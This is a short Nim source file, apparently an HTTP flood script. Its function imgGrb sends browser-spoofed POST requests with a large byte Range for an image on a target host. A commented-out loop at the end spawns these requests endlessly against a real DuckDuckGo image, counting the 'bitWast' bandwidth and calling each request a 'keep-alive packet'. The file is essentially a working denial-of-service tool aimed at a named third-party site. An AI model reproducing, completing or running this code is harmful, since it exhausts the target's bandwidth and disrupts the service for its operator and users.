import asynchttpserver, strutils, httpclient, threadpool, json

proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, timeout = 1200, log = false): bool =
  let client = newHttpClient(timeout = timeout)

  client.headers = newHttpHeaders({
    "Host": target,
    "User-Agent": userAgent,
    "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/;q=0.8,/*;q=0.5",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive",
    "Referer": referer,
    "Sec-Fetch-Dest": "image",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=5, i",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "TE": "trailers",
    "Range": "bytes=0-" & intToStr(range)})
  let body = %*{}

  try:
    let response = client.request(conType & target & targetImg, httpMethod = HttpPost, body = $body)
    if log == true:
      echo response.status
      echo "Response body: ", response.body

    if response.code == Http200 or response.code == Http206:
      return true
    else:
      if log == true:
        echo "Error: Unexpected HTTP status code: ", response.code
      return false

  except HttpRequestError as e:
    if log == true:
      echo "HTTP request failed: ", e.msg
    return false
  except CatchableError as e:
    if log == true:
      echo "An error occurred: ", e.msg
    return false

#[
var
  bitRange: int32 = 290235
  bitWast = 0
  target = "duckduckgo.com"
  targetImg = "/static-assets/image/pages/home/devices/how-it-works/desktop/search-protection-back-dark.png"

while true:
  var outPass = spawn imgGrb("https://", target, targetImg, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", bitRange, "https://duckduckgo.com/")
  if ^outPass == true:
    bitWast += bitRange
    echo "Send keep-alive packet to -> " & target & "[" & targetImg & "," & intToStr(bitWast) & "]"
]#
